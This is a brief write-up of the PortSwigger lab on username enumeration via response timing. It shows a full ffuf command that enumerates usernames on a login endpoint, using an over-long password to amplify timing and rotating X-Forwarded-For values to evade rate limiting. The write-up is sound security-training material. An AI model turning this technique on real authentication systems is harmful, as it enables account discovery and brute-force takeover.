# Challenge Name: Username enumeration via response timing 
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Username Enumeration

## 2. Root Cause
The application responds with different response times depending on whether the username exists, allowing attackers to distinguish valid usernames through timing analysis.
## 3. Attack Surface
`/login`

## 4. Exploit Method
The attacker sends login requests with a very long password to increase processing time when the username is valid.

Because the server takes longer to process valid usernames, response time can be used to distinguish existing accounts.

To bypass rate limiting, the attacker adds the `X-Forwarded-For` header with different IP values for each request.

Using ffuf in pitchfork mode, the attacker enumerates usernames and sorts results by response time to identify valid accounts.
## 5. Payload / Technique
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -w usernames.txt:W1 -w num.txt:W2 \   
     -X POST -d "username=W1&password=goodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd" \
     -H "X-Forwarded-For: 192.166.1.W2" \                                        
     -u https://0a92008a03ace25b81635cc8007f008f.web-security-academy.net/login \
-mode pitchfork -s \
-o result.html -of html
```

## 6. Impact
Username enumeration allows attackers to identify valid accounts, increasing the effectiveness of brute-force attacks and potentially leading to account takeover.
## 7. Reusable Pattern
When testing authentication endpoints, analyze response timing, response length, and status codes to detect potential information leakage that can allow username enumeration.
## 8. Key Takeaway
Authentication mechanisms should return consistent responses in timing, length, and content to prevent attackers from distinguishing valid and invalid usernames.
